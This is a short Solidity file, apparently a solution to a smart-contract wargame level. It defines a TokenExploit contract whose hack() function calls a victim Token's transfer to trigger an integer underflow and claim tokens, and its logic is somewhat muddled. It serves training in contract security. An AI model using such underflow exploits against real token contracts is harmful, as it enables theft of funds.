/*

you may edit this file however you want, but you must leave the TokenExploit contract 
having a hack function, a recieve function, and a constructor that takes an address

you may create more contracts and functions if you like.

*/


// SPDX-License-Identifier: Unlicense
pragma solidity ^0.6.0;
import "../../src/Token/Token.sol";

contract TokenExploit {
    Token victim;

    constructor(address _victim) public {
        victim = Token(payable(_victim));
    }

    function hack() public {
        // Exploit the underflow vulnerability
        victim.transfer(address(0), 21); // This will cause an underflow
        victim.transfer(address(this), 21); // Transfer the overflowed tokens to the attacker
    }

    receive() external payable {
    }
}
